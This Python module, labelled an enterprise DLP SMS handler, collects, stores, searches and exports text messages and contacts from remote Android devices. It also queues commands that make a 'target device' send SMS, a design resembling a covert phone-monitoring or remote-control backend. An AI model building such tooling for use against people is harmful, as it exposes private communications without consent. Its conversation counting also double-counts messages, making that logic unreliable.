"""
ATHEX DLP Enterprise - SMS Module (Complete)
=============================================
Processes SMS/MMS data from Android devices.
Handles message storage, conversation grouping,
search, export, and statistics.
"""

import json
import logging
import sqlite3
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Any, Optional

logger = logging.getLogger(__name__)


class SMSHandler:
    """
    Complete SMS data processing handler.
    
    Features:
    - Parse incoming SMS data
    - Store messages in database
    - Group by conversations
    - Search messages
    - Export to JSON/CSV
    - Statistics generation
    - Send SMS commands
    """
    
    def __init__(self, db_path: str = None):
        """
        Initialize SMS Handler.
        
        Args:
            db_path: Path to SQLite database for message storage
        """
        # In-memory cache
        self.cached_messages: Dict[str, List[Dict]] = {}
        self.conversations: Dict[str, Dict[str, Dict]] = {}
        
        # Database setup
        if db_path:
            self.db_path = Path(db_path)
        else:
            self.db_path = Path("data/sms_messages.db")
        
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_database()
        
        # Message queue for pending sends
        self.pending_sends: Dict[str, List[Dict]] = {}
        
        # Statistics
        self.stats = {
            "total_processed": 0,
            "total_stored": 0,
            "total_sent": 0
        }
        
        logger.info(f"SMSHandler initialized (DB: {self.db_path})")
    
    def _init_database(self):
        """Initialize SQLite database for message storage"""
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            # Messages table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    message_id INTEGER,
                    session_id TEXT,
                    thread_id INTEGER,
                    address TEXT,
                    contact_name TEXT,
                    body TEXT,
                    date INTEGER,
                    date_formatted TEXT,
                    type TEXT,
                    read INTEGER DEFAULT 1,
                    is_mms INTEGER DEFAULT 0,
                    direction TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Conversations table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS conversations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT,
                    address TEXT,
                    contact_name TEXT,
                    message_count INTEGER DEFAULT 0,
                    unread_count INTEGER DEFAULT 0,
                    last_message TEXT,
                    last_message_date INTEGER,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Indexes
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_messages_session 
                ON messages(session_id)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_messages_address 
                ON messages(address)
            ''')
            cursor.execute('''
                CREATE INDEX IF NOT EXISTS idx_messages_date 
                ON messages(date)
            ''')
            
            conn.commit()
            conn.close()
            
            logger.info("SMS database initialized")
            
        except sqlite3.Error as e:
            logger.error(f"SQLite database initialization error: {e}")
        except IOError as e:
            logger.error(f"IO error initializing database: {e}")
        except Exception as e:
            logger.error(f"Unexpected database initialization error: {e}")
    
    # ============================================================
    # MAIN PROCESSING
    # ============================================================
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process raw SMS data from device.
        
        Args:
            session_id: Device session ID
            raw_data: Raw SMS data (JSON string, list, or dict)
            
        Returns:
            Processed result with statistics
        """
        try:
            # Parse data
            if isinstance(raw_data, str):
                try:
                    data = json.loads(raw_data)
                except json.JSONDecodeError:
                    # Try parsing as pipe-delimited format
                    data = self._parse_pipe_format(raw_data)
            else:
                data = raw_data
            
            # Normalize to list
            if isinstance(data, dict):
                messages_list = data.get("messages", data.get("data", [data]))
            elif isinstance(data, list):
                messages_list = data
            else:
                return {"success": False, "error": "Invalid SMS data format"}
            
            if not messages_list:
                return {"success": True, "messages": [], "count": 0}
            
            # Process each message
            processed_messages = []
            conversations_updated = set()
            
            for msg in messages_list:
                processed = self._process_single_message(session_id, msg)
                if processed:
                    processed_messages.append(processed)
                    conversations_updated.add(processed.get("address", ""))
            
            # Sort by date (newest first)
            processed_messages.sort(key=lambda x: x.get("date", 0), reverse=True)
            
            # Update cache
            if session_id not in self.cached_messages:
                self.cached_messages[session_id] = []
            self.cached_messages[session_id].extend(processed_messages)
            
            # Limit cache size
            if len(self.cached_messages[session_id]) > 10000:
                self.cached_messages[session_id] = \
                    self.cached_messages[session_id][-5000:]
            
            # Store in database
            stored_count = self._store_messages(session_id, processed_messages)
            
            # Update conversations
            self._update_conversations(session_id)
            
            # Calculate statistics
            stats = self._calculate_stats(processed_messages)
            
            self.stats["total_processed"] += len(processed_messages)
            self.stats["total_stored"] += stored_count
            
            logger.info(f"💬 SMS: {len(processed_messages)} messages processed, "
                       f"{stored_count} stored from {session_id}")
            
            return {
                "success": True,
                "session_id": session_id,
                "messages": processed_messages[:200],  # Return first 200
                "total_count": len(processed_messages),
                "returned_count": min(len(processed_messages), 200),
                "stats": stats,
                "timestamp": datetime.now().isoformat()
            }
            
        except json.JSONDecodeError as e:
            logger.error(f"JSON decode error processing SMS: {e}")
            return {"success": False, "error": f"Invalid JSON data: {e}"}
        except Exception as e:
            logger.error(f"Error processing SMS: {e}")
            return {"success": False, "error": str(e)}
    
    def _parse_pipe_format(self, raw: str) -> list:
        """Parse pipe-delimited SMS format"""
        messages = []
        lines = raw.strip().split('\n')
        
        for line in lines:
            parts = line.split('|')
            if len(parts) >= 6:
                messages.append({
                    "address": parts[0],
                    "body": parts[1],
                    "date": int(parts[2]) if parts[2].isdigit() else 0,
                    "type": parts[3],
                    "read": parts[4] == "1" if len(parts) > 4 else True,
                    "thread_id": int(parts[5]) if len(parts) > 5 and parts[5].isdigit() else 0
                })
        
        return messages
    
    def _process_single_message(self, session_id: str, msg: Dict) -> Optional[Dict]:
        """Process a single SMS message"""
        try:
            msg_type = msg.get("type", 0)
            if isinstance(msg_type, str):
                msg_type = 1 if msg_type.lower() in ["inbox", "received", "1"] else \
                           2 if msg_type.lower() in ["sent", "outgoing", "2"] else 0
            
            return {
                "message_id": msg.get("_id", msg.get("id", 0)),
                "session_id": session_id,
                "thread_id": msg.get("thread_id", 0),
                "address": msg.get("address", "Unknown"),
                "contact_name": msg.get("contact_name", ""),
                "body": msg.get("body", ""),
                "body_preview": (msg.get("body", "") or "")[:100],
                "date": msg.get("date", 0),
                "date_formatted": msg.get("date_formatted", ""),
                "date_short": msg.get("date_short", ""),
                "type": "inbox" if msg_type == 1 else "sent" if msg_type == 2 else "draft",
                "type_code": msg_type,
                "read": bool(msg.get("read", True)),
                "seen": bool(msg.get("seen", True)),
                "is_mms": bool(msg.get("is_mms", False)),
                "direction": "received" if msg_type == 1 else "sent",
                "subject": msg.get("subject", ""),
                "service_center": msg.get("service_center", ""),
                "protocol": msg.get("protocol", ""),
                "locked": bool(msg.get("locked", False)),
                "error_code": msg.get("error_code", 0),
                "age_days": msg.get("age_days", 0),
                "processed_at": datetime.now().isoformat()
            }
            
        except KeyError as e:
            logger.error(f"Missing key in message data: {e}")
            return None
        except ValueError as e:
            logger.error(f"Value error processing message: {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error processing message: {e}")
            return None
    
    # ============================================================
    # DATABASE STORAGE
    # ============================================================
    
    def _store_messages(self, session_id: str, messages: List[Dict]) -> int:
        """Store messages in database"""
        stored = 0
        
        try:
            conn = sqlite3.connect(str(self.db_path))
            cursor = conn.cursor()
            
            for msg in messages:
                # Check if message already exists
                cursor.execute(
                    "SELECT id FROM messages WHERE message_id = ? AND session_id = ?",
                    (msg.get("message_id", 0), session_id)
                )
                
                if cursor.fetchone() is None:
                    cursor.execute('''
                        INSERT INTO messages 
                        (message_id, session_id, thread_id, address, contact_name, 
                         body, date, date_formatted, type, read, is_mms, direction)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                    ''', (
                        msg.get("message_id", 0),
                        session_id,
                        msg.get("thread_id", 0),
                        msg.get("address", ""),
                        msg.get("contact_name", ""),
                        msg.get("body", ""),
                        msg.get("date", 0),
                        msg.get("date_formatted", ""),
                        msg.get("type", ""),
                        1 if msg.get("read") else 0,
                        1 if msg.get("is_mms") else 0,
                        msg.get("direction", "")
                    ))
                    stored += 1
            
            conn.commit()
            conn.close()
            
        except sqlite3.Error as e:
            logger.error(f"SQLite database storage error: {e}")
        except IOError as e:
            logger.error(f"IO error storing messages: {e}")
        except Exception as e:
            logger.error(f"Unexpected database storage error: {e}")
        
        return stored
    
    # ============================================================
    # CONVERSATIONS
    # ============================================================
    
    def _update_conversations(self, session_id: str):
        """Update conversation groupings"""
        messages = self.cached_messages.get(session_id, [])
        
        if session_id not in self.conversations:
            self.conversations[session_id] = {}
        
        convs = self.conversations[session_id]
        
        for msg in messages:
            address = msg.get("address", "Unknown")
            
            if address not in convs:
                convs[address] = {
                    "address": address,
                    "contact_name": msg.get("contact_name", ""),
                    "thread_id": msg.get("thread_id", 0),
                    "messages": [],
                    "message_count": 0,
                    "unread_count": 0,
                    "first_message_date": None,
                    "last_message_date": None,
                    "last_message": None
                }
            
            conv = convs[address]
            conv["messages"].append(msg)
            conv["message_count"] += 1
            
            if not msg.get("read", True):
                conv["unread_count"] += 1
            
            msg_date = msg.get("date", 0)
            if not conv["first_message_date"] or msg_date < conv["first_message_date"]:
                conv["first_message_date"] = msg_date
            
            if not conv["last_message_date"] or msg_date > conv["last_message_date"]:
                conv["last_message_date"] = msg_date
                conv["last_message"] = msg
    
    def get_conversations(self, session_id: str, limit: int = 50) -> List[Dict]:
        """
        Get conversation list for a device.
        
        Args:
            session_id: Device session ID
            limit: Max conversations to return
            
        Returns:
            List of conversations sorted by last message date
        """
        convs = self.conversations.get(session_id, {})
        
        # Convert to list and sort
        conv_list = list(convs.values())
        conv_list.sort(
            key=lambda x: x.get("last_message_date", 0) or 0,
            reverse=True
        )
        
        # Format for output (remove full message list)
        result = []
        for conv in conv_list[:limit]:
            result.append({
                "address": conv["address"],
                "contact_name": conv["contact_name"],
                "thread_id": conv["thread_id"],
                "message_count": conv["message_count"],
                "unread_count": conv["unread_count"],
                "last_message": {
                    "body": (conv["last_message"].get("body", "") or "")[:100] if conv["last_message"] else "",
                    "date": conv["last_message"].get("date_formatted", "") if conv["last_message"] else "",
                    "type": conv["last_message"].get("type", "") if conv["last_message"] else ""
                } if conv["last_message"] else None,
                "first_message_date": conv["first_message_date"],
                "last_message_date": conv["last_message_date"]
            })
        
        return result
    
    def get_conversation_messages(self, session_id: str, address: str, 
                                   limit: int = 50, offset: int = 0) -> List[Dict]:
        """
        Get messages for a specific conversation.
        
        Args:
            session_id: Device session ID
            address: Phone number/address
            limit: Max messages to return
            offset: Pagination offset
            
        Returns:
            List of messages
        """
        convs = self.conversations.get(session_id, {})
        conv = convs.get(address, {})
        
        messages = conv.get("messages", [])
        messages.sort(key=lambda x: x.get("date", 0), reverse=True)
        
        return messages[offset:offset + limit]
    
    # ============================================================
    # SEARCH
    # ============================================================
    
    def search_messages(self, session_id: str, query: str, 
                        address: str = None, limit: int = 50) -> List[Dict]:
        """
        Search messages by content or address.
        
        Args:
            session_id: Device session ID
            query: Search query
            address: Optional address filter
            limit: Max results
            
        Returns:
            Matching messages
        """
        messages = self.cached_messages.get(session_id, [])
        query = query.lower()
        
        results = []
        for msg in messages:
            # Address filter
            if address and msg.get("address") != address:
                continue
            
            # Search in body
            if query in (msg.get("body", "") or "").lower():
                results.append(msg)
                continue
            
            # Search in address
            if query in msg.get("address", "").lower():
                results.append(msg)
                continue
            
            # Search in contact name
            if query in msg.get("contact_name", "").lower():
                results.append(msg)
                continue
        
        return results[:limit]
    
    def search_by_date_range(self, session_id: str, 
                             start_date: int, end_date: int,
                             address: str = None) -> List[Dict]:
        """
        Search messages by date range.
        
        Args:
            session_id: Device session ID
            start_date: Start timestamp
            end_date: End timestamp
            address: Optional address filter
            
        Returns:
            Messages in date range
        """
        messages = self.cached_messages.get(session_id, [])
        
        results = []
        for msg in messages:
            msg_date = msg.get("date", 0)
            
            if msg_date < start_date or msg_date > end_date:
                continue
            
            if address and msg.get("address") != address:
                continue
            
            results.append(msg)
        
        return results
    
    # ============================================================
    # SEND SMS
    # ============================================================
    
    def queue_send_sms(self, session_id: str, number: str, message: str) -> Dict:
        """
        Queue an SMS to be sent.
        
        Args:
            session_id: Target device session ID
            number: Recipient phone number
            message: SMS content
            
        Returns:
            Queued message info
        """
        if session_id not in self.pending_sends:
            self.pending_sends[session_id] = []
        
        send_request = {
            "id": f"send_{int(datetime.now().timestamp())}",
            "number": number,
            "message": message,
            "length": len(message),
            "queued_at": datetime.now().isoformat(),
            "status": "pending"
        }
        
        self.pending_sends[session_id].append(send_request)
        
        logger.info(f"📤 SMS queued: {number} ({len(message)} chars) via {session_id}")
        
        return {
            "success": True,
            "send_request": send_request,
            "command": f"SEND_SMS|{number}|{message}"
        }
    
    def mark_sent(self, session_id: str, send_id: str):
        """Mark a queued SMS as sent"""
        if session_id in self.pending_sends:
            for req in self.pending_sends[session_id]:
                if req["id"] == send_id:
                    req["status"] = "sent"
                    req["sent_at"] = datetime.now().isoformat()
                    self.stats["total_sent"] += 1
                    break
    
    def get_pending_sends(self, session_id: str) -> List[Dict]:
        """Get pending SMS sends"""
        return self.pending_sends.get(session_id, [])
    
    # ============================================================
    # STATISTICS & EXPORT
    # ============================================================
    
    def _calculate_stats(self, messages: List[Dict]) -> Dict:
        """Calculate message statistics"""
        total = len(messages)
        inbox = sum(1 for m in messages if m.get("type") == "inbox")
        sent = sum(1 for m in messages if m.get("type") == "sent")
        unread = sum(1 for m in messages if not m.get("read", True))
        mms = sum(1 for m in messages if m.get("is_mms"))
        
        # Count unique contacts
        contacts = set(m.get("address") for m in messages)
        
        # Messages by hour
        hourly = {}
        for m in messages:
            if m.get("date_formatted"):
                try:
                    hour = m["date_formatted"][11:13]
                    hourly[hour] = hourly.get(hour, 0) + 1
                except (IndexError, KeyError):
                    pass
        
        return {
            "total": total,
            "inbox": inbox,
            "sent": sent,
            "draft": total - inbox - sent,
            "unread": unread,
            "mms": mms,
            "unique_contacts": len(contacts),
            "by_hour": hourly
        }
    
    def get_stats(self, session_id: str) -> Dict:
        """Get overall statistics"""
        messages = self.cached_messages.get(session_id, [])
        return self._calculate_stats(messages)
    
    def get_global_stats(self) -> Dict:
        """Get global statistics across all devices"""
        total_messages = sum(
            len(msgs) for msgs in self.cached_messages.values()
        )
        
        return {
            "total_processed": self.stats["total_processed"],
            "total_stored": self.stats["total_stored"],
            "total_sent": self.stats["total_sent"],
            "cached_messages": total_messages,
            "active_devices": len(self.cached_messages),
            "active_conversations": sum(
                len(convs) for convs in self.conversations.values()
            )
        }
    
    def export_to_json(self, session_id: str, filepath: str = None) -> str:
        """
        Export messages to JSON.
        
        Args:
            session_id: Device session ID
            filepath: Optional file path to save
            
        Returns:
            JSON string or file path
        """
        messages = self.cached_messages.get(session_id, [])
        
        export_data = {
            "session_id": session_id,
            "exported_at": datetime.now().isoformat(),
            "message_count": len(messages),
            "messages": messages
        }
        
        json_str = json.dumps(export_data, indent=2)
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(json_str)
            return filepath
        
        return json_str
    
    def export_to_csv(self, session_id: str, filepath: str = None) -> str:
        """
        Export messages to CSV.
        
        Args:
            session_id: Device session ID
            filepath: Optional file path to save
            
        Returns:
            CSV string or file path
        """
        messages = self.cached_messages.get(session_id, [])
        
        csv_lines = ["address,contact_name,body,date,type,read"]
        
        for msg in messages:
            body = (msg.get("body", "") or "").replace('"', '""')
            csv_lines.append(
                f'"{msg.get("address", "")}",'
                f'"{msg.get("contact_name", "")}",'
                f'"{body}",'
                f'"{msg.get("date_formatted", "")}",'
                f'"{msg.get("type", "")}",'
                f'"{msg.get("read", True)}"'
            )
        
        csv_str = '\n'.join(csv_lines)
        
        if filepath:
            with open(filepath, 'w') as f:
                f.write(csv_str)
            return filepath
        
        return csv_str
    
    # ============================================================
    # DASHBOARD FORMATTING
    # ============================================================
    
    def format_for_dashboard(self, messages: List[Dict] = None, 
                             session_id: str = None) -> List[Dict]:
        """
        Format messages for dashboard display.
        
        Args:
            messages: List of messages (or use cached)
            session_id: Device session ID
            
        Returns:
            Dashboard-formatted messages
        """
        if messages is None and session_id:
            messages = self.cached_messages.get(session_id, [])[:50]
        elif messages is None:
            return []
        
        dashboard = []
        for msg in messages[:50]:
            body = (msg.get("body", "") or "")[:80]
            
            dashboard.append({
                "id": msg.get("message_id", 0),
                "address": msg.get("address", "Unknown"),
                "name": msg.get("contact_name", "N/A"),
                "body": body,
                "body_full": body + "..." if len(msg.get("body", "") or "") > 80 else body,
                "date": msg.get("date_formatted", ""),
                "date_short": msg.get("date_short", ""),
                "type": msg.get("type", ""),
                "read": msg.get("read", True),
                "is_mms": msg.get("is_mms", False),
                "direction": msg.get("direction", ""),
                "icon": "📥" if msg.get("direction") == "received" else "📤",
                "color": "#10b981" if msg.get("direction") == "received" else "#3b82f6"
            })
        
        return dashboard
    
    def get_conversation_list_dashboard(self, session_id: str) -> List[Dict]:
        """Get conversation list formatted for dashboard"""
        conversations = self.get_conversations(session_id)
        
        dashboard = []
        for conv in conversations:
            dashboard.append({
                "address": conv["address"],
                "name": conv["contact_name"] or conv["address"],
                "message_count": conv["message_count"],
                "unread": conv["unread_count"],
                "last_message": (conv.get("last_message", {}) or {}).get("body", "")[:50],
                "last_date": (conv.get("last_message", {}) or {}).get("date", ""),
                "has_unread": conv["unread_count"] > 0
            })
        
        return dashboard
    
    # ============================================================
    # CLEANUP
    # ============================================================
    
    def clear_cache(self, session_id: str = None):
        """Clear cached messages"""
        if session_id:
            self.cached_messages.pop(session_id, None)
            self.conversations.pop(session_id, None)
            self.pending_sends.pop(session_id, None)
        else:
            self.cached_messages.clear()
            self.conversations.clear()
            self.pending_sends.clear()
    
    def shutdown(self):
        """Clean shutdown"""
        logger.info("SMSHandler shutting down")
        self.clear_cache()


# ============================================================
# SINGLETON
# ============================================================
sms_handler = SMSHandler()


# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    
    handler = SMSHandler()
    
    # Test processing
    test_data = [
        {
            "_id": 1, "thread_id": 100, "address": "+1234567890",
            "contact_name": "John Doe", "body": "Hey, how are you?",
            "date": 1700000000000, "date_formatted": "2024-01-15 10:30:00",
            "type": 1, "read": True
        },
        {
            "_id": 2, "thread_id": 100, "address": "+1234567890",
            "contact_name": "John Doe", "body": "I'm good, thanks!",
            "date": 1700000001000, "date_formatted": "2024-01-15 10:30:01",
            "type": 2, "read": True
        },
        {
            "_id": 3, "thread_id": 200, "address": "+9876543210",
            "contact_name": "Jane Smith", "body": "Meeting at 3pm",
            "date": 1700000002000, "date_formatted": "2024-01-15 11:00:00",
            "type": 1, "read": False
        }
    ]
    
    result = handler.process("test_session", test_data)
    
    print(f"\n📊 Process Result: {result['success']}")
    print(f"📝 Total: {result['total_count']}")
    print(f"📈 Stats: {json.dumps(result['stats'], indent=2)}")
    
    # Test conversations
    convs = handler.get_conversations("test_session")
    print(f"\n💬 Conversations: {len(convs)}")
    for conv in convs:
        print(f"  📱 {conv['address']} ({conv['contact_name']}): {conv['message_count']} msgs, {conv['unread_count']} unread")
    
    # Test search
    results = handler.search_messages("test_session", "meeting")
    print(f"\n🔍 Search 'meeting': {len(results)} results")
    
    # Test dashboard format
    dashboard = handler.format_for_dashboard(session_id="test_session")
    print(f"\n📊 Dashboard: {len(dashboard)} entries")
    for d in dashboard:
        print(f"  {d['icon']} {d['name']}: {d['body'][:50]}")